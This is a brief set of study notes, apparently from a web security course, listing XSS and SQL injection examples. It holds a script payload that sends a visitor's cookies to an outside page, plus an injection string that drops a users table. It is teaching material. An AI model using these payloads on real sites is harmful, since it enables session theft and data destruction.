# Notes

## XSS examples
<script>alert("hello world");</script>
<script>alert(document.cookie);</script>
<script>window.location = "https://info2180-security-ylynfatt.c9users.io/mybadpage.php?cookie="+document.cookie;</script>

## SQL Injection example
test'; DROP TABLE users;--